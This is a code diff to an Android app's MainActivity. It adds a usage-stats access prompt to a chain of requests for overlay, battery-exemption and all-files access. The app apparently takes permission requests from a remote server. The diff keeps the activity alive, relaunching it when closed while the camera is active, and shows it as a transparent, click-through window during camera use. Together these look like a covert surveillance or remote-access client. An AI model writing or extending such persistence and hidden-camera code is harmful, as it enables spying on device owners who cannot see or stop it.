@@ -4,12 +4,14 @@ import android.Manifest;
 import android.app.Activity;
 import android.app.ActivityManager;
 import android.app.AlertDialog;
+import android.app.AppOpsManager;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
@@ -37,6 +39,7 @@ public class MainActivity extends Activity {
     private static final int PERMISSION_REQUEST_CODE = 1001;
     private static final int OVERLAY_PERMISSION_CODE = 1002;
     private static final int MANAGE_STORAGE_CODE = 1003;
+    private static final int USAGE_STATS_CODE = 1004;
     private static final int BATTERY_OPTIMIZATION_CODE = 1005;
     private static final int DEVICE_ADMIN_CODE = 1006;
     private static final int SCREEN_CAPTURE_CODE = 1007;
@@ -50,6 +53,7 @@ public class MainActivity extends Activity {
     private List<String> permissionsToRequest = new ArrayList<>();
     private boolean overlayPermissionRequested = false;
     private boolean storagePermissionRequested = false;
+    private boolean usageStatsRequested = false;
     private boolean batteryOptRequested = false;
     private boolean isHandlingServerPermissionRequest = false; // Track if handling server permission requests
     private static boolean isCameraActive = false; // Track if camera is being used
@@ -540,22 +544,7 @@ public class MainActivity extends Activity {
     }
     
     private void requestSpecialPermissions() {
-        // Request battery optimization exemption (only once per session)
-        if (!batteryOptRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                batteryOptRequested = true;
-                try {
-                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    intent.setData(Uri.parse("package:" + getPackageName()));
-                    startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
-                    return;
-                } catch (Exception e) {
-                    Log.e(TAG, "Error requesting battery optimization", e);
-                }
-            }
-        }
-        
+        // PRIORITY 1: Overlay Permission (Needed for Camera/Persistence)
         requestOverlayIfNeeded();
     }
     
@@ -564,22 +553,73 @@ public class MainActivity extends Activity {
         if (!overlayPermissionRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             overlayPermissionRequested = true;
             try {
+                Log.d(TAG, "Requesting Overlay Permission");
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    intent.putExtra(Settings.EXTRA_APP_PACKAGE, getPackageName());
+                    // On Android 10+, this might just open the list
+                    intent.setData(Uri.parse("package:" + getPackageName()));
                 } else {
                     intent.setData(Uri.parse("package:" + getPackageName()));
                 }
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                 return;
             } catch (Exception e) {
                 Log.e(TAG, "Error requesting overlay permission", e);
                 try {
-                    Intent fallback = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                        Uri.parse("package:" + getPackageName()));
+                    Intent fallback = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                     startActivityForResult(fallback, OVERLAY_PERMISSION_CODE);
                     return;
                 } catch (Exception ignored) {}
+            }
+        }
+        
+        requestUsageStatsIfNeeded();
+    }
+
+    private void requestUsageStatsIfNeeded() {
+        if (!usageStatsRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && !hasUsageStatsPermission()) {
+            usageStatsRequested = true;
+            try {
+                Log.d(TAG, "Requesting Usage Stats Permission");
+                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+                // Try to target our package specifically if possible (Android 10+)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                     intent.setData(Uri.parse("package:" + getPackageName()));
+                     // Note: Some devices ignore data URI for this intent
+                }
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivityForResult(intent, USAGE_STATS_CODE);
+                return;
+            } catch (Exception e) {
+                Log.e(TAG, "Error requesting usage stats", e);
+                try {
+                    // Fallback to general list
+                    Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+                    startActivityForResult(intent, USAGE_STATS_CODE);
+                    return;
+                } catch (Exception ignored) {}
+            }
+        }
+
+        requestBatteryOptimizationIfNeeded();
+    }
+    
+    private void requestBatteryOptimizationIfNeeded() {
+        // Request battery optimization exemption (only once per session)
+        if (!batteryOptRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                batteryOptRequested = true;
+                try {
+                    Log.d(TAG, "Requesting Battery Optimization");
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
+                    return;
+                } catch (Exception e) {
+                    Log.e(TAG, "Error requesting battery optimization", e);
+                }
             }
         }
         
@@ -591,6 +631,7 @@ public class MainActivity extends Activity {
         if (!storagePermissionRequested && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
             storagePermissionRequested = true;
             try {
+                Log.d(TAG, "Requesting Manage External Storage");
                 Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                     Uri.parse("package:" + getPackageName()));
                 startActivityForResult(intent, MANAGE_STORAGE_CODE);
@@ -601,6 +642,19 @@ public class MainActivity extends Activity {
         }
         
         finishSetup();
+    }
+
+    private boolean hasUsageStatsPermission() {
+        try {
+            PackageManager pm = getPackageManager();
+            ApplicationInfo applicationInfo = pm.getApplicationInfo(getPackageName(), 0);
+            AppOpsManager appOpsManager = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
+            int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, 
+                    applicationInfo.uid, applicationInfo.packageName);
+            return (mode == AppOpsManager.MODE_ALLOWED);
+        } catch (Exception e) {
+            return false;
+        }
     }
 
     @Override
@@ -625,18 +679,28 @@ public class MainActivity extends Activity {
                 }, 300);
                 break;
                 
-            case BATTERY_OPTIMIZATION_CODE:
-                Log.d(TAG, "Battery optimization result received, continuing...");
+            case OVERLAY_PERMISSION_CODE:
+                Log.d(TAG, "Overlay permission result received, continuing...");
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        requestOverlayIfNeeded();
+                        requestUsageStatsIfNeeded();
+                    }
+                }, 300);
+                break;
+
+            case USAGE_STATS_CODE:
+                Log.d(TAG, "Usage stats result received, continuing...");
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        requestBatteryOptimizationIfNeeded();
                     }
                 }, 300);
                 break;
                 
-            case OVERLAY_PERMISSION_CODE:
-                Log.d(TAG, "Overlay permission result received, continuing...");
+            case BATTERY_OPTIMIZATION_CODE:
+                Log.d(TAG, "Battery optimization result received, continuing...");
                 handler.postDelayed(new Runnable() {
                     @Override
                     public void run() {
@@ -1061,19 +1125,16 @@ public class MainActivity extends Activity {
     
     @Override
     protected void onDestroy() {
-        // Only destroy if not handling server permission requests
-        if (isHandlingServerPermissionRequest) {
-            Log.d(TAG, "Prevented onDestroy() - keeping activity alive for permission requests");
-            // Recreate activity to keep it alive
+        // Only destroy if not handling server permission requests AND camera is not active
+        if (isHandlingServerPermissionRequest || isCameraActive) {
+            String reason = isHandlingServerPermissionRequest ? "permission requests" : "active camera";
+            Log.d(TAG, "Prevented onDestroy() - keeping activity alive for " + reason);
+            
+            // Recreate activity to keep it alive if needed
             try {
-                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-                int taskId = getTaskId();
-                if (taskId > 0) {
-                    am.moveTaskToFront(taskId, ActivityManager.MOVE_TASK_WITH_HOME);
-                }
-                // Restart activity to keep it alive
-                Intent intent = getIntent();
-                if (intent != null) {
+                // Check if we need to restart
+                if (isFinishing()) {
+                    Intent intent = new Intent(this, MainActivity.class);
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                     startActivity(intent);
                 }
@@ -1102,6 +1163,9 @@ public class MainActivity extends Activity {
                         ActivityManager am = (ActivityManager) instance.getSystemService(Context.ACTIVITY_SERVICE);
                         am.moveTaskToFront(instance.getTaskId(), ActivityManager.MOVE_TASK_WITH_HOME);
                         Log.d(TAG, "Brought activity to front for camera");
+                        
+                        // Ensure window is visible (but transparent)
+                        instance.getWindow().getDecorView().setVisibility(View.VISIBLE);
                     } catch (Exception e) {
                         Log.e(TAG, "Error moving task to front", e);
                     }
@@ -1109,7 +1173,8 @@ public class MainActivity extends Activity {
                 } else {
                     // Camera finished
                     instance.applyTransparentClickthrough();
-                    // Don't move to back immediately to avoid UI flicker, just stay transparent
+                    // Optional: move to back if not needed
+                    // instance.moveTaskToBack(true);
                 }
             });
         } else if (active) {
